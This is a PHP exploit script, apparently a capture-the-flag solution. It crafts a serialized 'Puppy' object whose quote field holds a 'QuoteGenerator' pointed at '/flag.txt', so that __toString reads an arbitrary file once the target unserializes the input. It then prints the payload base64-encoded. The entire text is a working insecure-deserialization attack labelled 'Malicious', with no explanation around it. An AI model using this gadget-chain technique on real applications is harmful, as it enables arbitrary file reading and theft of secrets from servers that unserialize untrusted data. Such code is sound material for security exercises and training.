<?php
class Puppy{
    public $eyeColor, $eyeSize, $background, $quote;
  
    function getImg(){
      $puppyGenerator = new PuppyGenerator();
      $puppyGenerator->generatePuppyImage($this->eyeColor, $this->eyeSize, $this->background, $this->quote);
    }
  }

  class QuoteGenerator {
    public $quoteFile = 'data/quotes.txt'; // Path to the quotes file
  
    // Function to get a random quote
    function getRandomQuote() {
        // Load quotes file
        $quotes = file($this->quoteFile);
        if(!$quotes) {
            die("Failed to load quotes file.");
        }
  
        // Pick a random quote
        $quote = $quotes[array_rand($quotes)];
        return $quote;
    }
  
    function __toString(){
      return $this->getRandomQuote();
    }
  
  }

// Malicious Puppy class
$quoteGenerator = new QuoteGenerator();
$quoteGenerator->quoteFile = '/flag.txt';

$puppy = new Puppy();
$puppy->eyeColor = array(0, 0, 0);
$puppy->eyeSize = 100;
$puppy->background = array(255, 255, 255);
$puppy->quote = $quoteGenerator;

// echo the base64 of serialized object
echo base64_encode(serialize($puppy));

?>